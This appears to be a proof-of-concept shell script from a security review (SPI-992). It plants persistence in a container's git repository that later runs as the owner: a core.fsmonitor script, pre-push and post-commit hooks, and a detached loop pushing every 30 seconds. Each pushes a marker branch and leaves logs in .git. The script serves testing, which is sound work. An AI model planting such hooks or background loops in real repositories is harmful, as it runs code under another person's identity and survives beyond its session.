#!/bin/sh
# SPI-992 M2's persistence case (review H1), run by a linked thread as one command (`sh .spi992/plant.sh <stamp>`): it
# plants what would run later as the owner, each trying to push a ref of its own:
#   - core.fsmonitor: runs on the owner's next `git status` (spi992/fsm-<stamp>)
#   - a pre-push hook: runs inside the owner's Commit & push (spi992/hook-<stamp>)
#   - a payload script the owner's tooling runs, wired as a post-commit hook (spi992/payload-<stamp>)
#   - a detached loop pushing every 30 s (spi992/loop-<stamp>), which a Container restart ends
# Logs go to .git/spi992-*.log (the Workspace's own files, so they outlive the Container).
set -u
S=$1
cd /workspace/repo || exit 1
G=/workspace/repo/.git
cat >"$G/spi992-fsm.sh" <<EOF
#!/bin/sh
( git push --no-verify origin HEAD:refs/heads/spi992/fsm-$S >> $G/spi992-fsm.log 2>&1 & )
exit 1
EOF
chmod +x "$G/spi992-fsm.sh"
git config core.fsmonitor "$G/spi992-fsm.sh"
cat >"$G/hooks/pre-push" <<EOF
#!/bin/sh
git push --no-verify origin HEAD:refs/heads/spi992/hook-$S >> $G/spi992-hook.log 2>&1
exit 0
EOF
chmod +x "$G/hooks/pre-push"
mkdir -p .spi992
cat >.spi992/payload.sh <<EOF
#!/bin/sh
git push --no-verify origin HEAD:refs/heads/spi992/payload-$S >> $G/spi992-payload.log 2>&1
EOF
chmod +x .spi992/payload.sh
printf '#!/bin/sh\nsh /workspace/repo/.spi992/payload.sh &\nexit 0\n' >"$G/hooks/post-commit"
chmod +x "$G/hooks/post-commit"
setsid nohup sh -c "while :; do git -C /workspace/repo push --no-verify origin HEAD:refs/heads/spi992/loop-$S >> $G/spi992-loop.log 2>&1; sleep 30; done" >/dev/null 2>&1 &
echo "planted $S"
